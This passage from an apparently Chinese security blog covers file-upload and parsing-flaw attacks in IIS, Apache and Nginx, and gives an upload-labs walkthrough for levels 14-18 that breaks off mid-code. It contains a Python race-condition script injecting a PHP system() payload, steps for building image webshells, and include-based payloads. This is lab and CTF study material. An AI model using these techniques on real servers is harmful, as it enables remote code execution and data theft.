<h3 id="解析漏洞攻击"><a href="#解析漏洞攻击" class="headerlink" title="解析漏洞攻击"></a>解析漏洞攻击</h3><p>主要有目录解析、文件解析，Apache解析漏洞、Nginx解析漏洞、IIS7.5解析漏洞。</p>
<h4 id="zip-amp-bzip2-amp-zlib"><a href="#zip-amp-bzip2-amp-zlib" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib://"></a><strong>zip:// &amp; bzip2:// &amp; zlib://</strong></h4><p><strong>作用：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">zip:<span class="comment">// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件</span></span><br><span class="line"></span><br><span class="line">更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等</span><br></pre></td></tr></table></figure>
<h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">phar:&#x2F;&#x2F;协议与zip:&#x2F;&#x2F;类似，同样可以访问zip格式压缩包内容</span><br><span class="line">#经常使用于序列化</span><br></pre></td></tr></table></figure>
<h3 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h3><p><a href="https://www.freebuf.com/news/202819.html">利用session.upload_progress进行文件包含</a></p>
<p><a href="https://ctf.show/">CTFSHOW</a></p>
<p><code>sess_flag</code></p>
<p><img src="C:/Users/13611/Desktop/nep冬令营/讲课/深入一些吧.assets/4.png" alt="4"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessID = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;url&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">256</span> * <span class="number">1</span>) <span class="comment">#建议正常这个填充数据大一点</span></span><br><span class="line">        response = session.post(</span><br><span class="line">            url,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessID&#125;,</span><br><span class="line">            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;cat ../f*&quot;);?&gt;&#x27;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(url+<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">write = threading.Thread(target=write, args=(session,))</span><br><span class="line">write.daemon = <span class="literal">True</span> <span class="comment">#当daemon为True时，父线程在运行完毕后，子线程无论是否正在运行，都会伴随主线程一起退出。</span></span><br><span class="line">write.start()</span><br><span class="line">read()</span><br></pre></td></tr></table></figure>
<h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p>
<p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p>
<p>那么在长度有限的时候，<code>././././</code> (n个) 的形式就可以通过这个把路径爆掉</p>
<p>在php代码包含中，这种绕过方式要求php版本 &lt; php 5.2.8</p>
<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="一-IIS5-x-6-x解析漏洞"><a href="#一-IIS5-x-6-x解析漏洞" class="headerlink" title="(一)IIS5.x-6.x解析漏洞"></a>(一)IIS5.x-6.x解析漏洞</h3><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp;该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
<p>目录解析(6.0)<br>形式：www.xxx.com/xx.asp/xx.jpg<br>原理: 服务器默认会把.asp，.asp目录下的文件都解析成asp文件。（传个图片马）</p>
<p>文件解析<br>形式：www.xxx.com/xx.asp;.jpg（文件名）<br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。<br>解析文件类型</p>
<p>IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>/test.asa<br>/test.cer<br>/test.cdx</p>
<h4 id="Iis7-5解析漏洞-php-ini开启fix-pathinfo"><a href="#Iis7-5解析漏洞-php-ini开启fix-pathinfo" class="headerlink" title="Iis7.5解析漏洞(php.ini开启fix_pathinfo)"></a>Iis7.5解析漏洞(php.ini开启fix_pathinfo)</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.php --&gt; &#x2F;xx.jpg         &#x2F;&#x2F;上传.jpg一句话，访问时后面加上&#x2F;xx.php </span><br></pre></td></tr></table></figure>
<h3 id="二-apache解析漏洞"><a href="#二-apache解析漏洞" class="headerlink" title="(二)apache解析漏洞"></a>(二)apache解析漏洞</h3><p>PHP 5.2 00存在截断上传（0x00）(%00)<br>PHP 5.3之后就没有了该漏洞</p>
<p>漏洞原理<br>Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如test.php.qwe.asd “.qwe”和”.asd” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.qwe.asd解析成php。</p>
<p>漏洞形式<br>www.xxxx.xxx.com/test.php.php123<br>其余配置问题导致漏洞</p>
<p>(1)如果在 Apache 的 conf 里有这样一行配置 </p>
<p>AddHandler php5-script .php</p>
<p> 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>(2)如果在 Apache 的 conf 里有这样一行配置 </p>
<p>AddType application/x-httpd-php .jpg </p>
<p>即使扩展名是 jpg，一样能以php 方式执行。（htaccess文件上传解析漏洞，可以将这段代码写到.htaccess中，再上传写有php一句话代码的jpg文件中）</p>
<h3 id="三-nginx解析漏洞"><a href="#三-nginx解析漏洞" class="headerlink" title="(三)nginx解析漏洞"></a>(三)nginx解析漏洞</h3><p>漏洞原理<br>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为 “phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：<br>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
<p>漏洞形式<br>www.xxxx.com/UploadFiles/image/1.jpg/1.php<br>www.xxxx.com/UploadFiles/image/1.jpg%00.php<br>www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</p>
<p>另外一种手法：上传一个名字为test.jpg，然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p>
<p>nginx解析漏洞(php.ini开启fix_pathinfo)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.php --&gt; xxx.jpg%00.php      &#x2F;&#x2F;Nginx &lt;8.03 空字节代码执行漏洞</span><br></pre></td></tr></table></figure>
<h3 id="四-IIS7-5解析漏洞"><a href="#四-IIS7-5解析漏洞" class="headerlink" title="(四)IIS7.5解析漏洞"></a>(四)IIS7.5解析漏洞</h3><p>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs学习下篇</title>
    <url>/2021/04/24/upload-labs%E5%AD%A6%E4%B9%A0%E4%B8%8B%E7%AF%87/</url>
    <content><![CDATA[<h1 id="upload-labs靶场训练篇（windows版21题）14-21题"><a href="#upload-labs靶场训练篇（windows版21题）14-21题" class="headerlink" title="upload-labs靶场训练篇（windows版21题）14-21题"></a>upload-labs靶场训练篇（windows版21题）14-21题</h1><p>upload-labs为文件上传的训练靶场，目前一共有21关，基本涵盖了目前全部的文件上传漏洞。此篇为下篇。</p>
<span id="more"></span>
<h2 id="level-14-图片马之文件头检测"><a href="#level-14-图片马之文件头检测" class="headerlink" title="level-14(图片马之文件头检测)"></a>level-14(图片马之文件头检测)</h2><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答:"></a>解答:</h3><p>图片马</p>
<p>拓展一下如何制作图片马：</p>
<p>思路：上传图片马，制作：<code>copy x.jpg/b + x.php/a xx.jpg</code>，上传后需要结合文件包含漏洞利用，或者目标服务器支持以php解析.jpg后缀，这里需要注意的是图片马中的一句话能写到中间尽量写到中间，真实环境不容易被发现，可用winhex或bp修改<br>copy使用注意事项：图片一定要在copy后面，否则创建出来的木马图片有可能无法显示，例如，<code>copy x.php/a + x.gif/b xx.gif</code>，xx.gif就无法显示。</p>
<p>本题上传图片马后，利用作者留下的include.php来验证。</p>
<p>payload:<code>include.php?file=upload/xx.gif</code></p>
<p>执行<code>phpinfo();</code>成功</p>
<h2 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h2><h3 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = getimagesize(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = image_type_to_extension(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = isImage(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>本题检验文件头，采用:<code>GIF89a</code>来绕过，详细步骤与上题一样。</p>
<p>拓展图片文件头：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JPEG (jpg)，文件头hex：FF D8 FF</span><br><span class="line">PNG (png)，文件头hex：89 50 4E 47</span><br><span class="line">GIF (gif)，文件头hex：47 49 46 38（也就是GIF89a）</span><br></pre></td></tr></table></figure>
<h2 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = exif_imagetype(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = isImage(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><p>与14和15的方法一样。需要环境：PHP版本大于5.2.10，且开启php_exif扩展</p>
<h2 id="level-17"><a href="#level-17" class="headerlink" title="level-17"></a>level-17</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= substr(strrchr(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromjpeg(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagejpeg(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefrompng(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagepng(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromgif(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagegif(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><p>二次渲染，传gif。具体上传方式会在总结的笔记中详细记录</p>
<h2 id="level-18"><a href="#level-18" class="headerlink" title="level-18"></a>level-18</h2><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$file_name</span>,strrpos(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             rename(<span class="variable">$upload_file</span>, <span 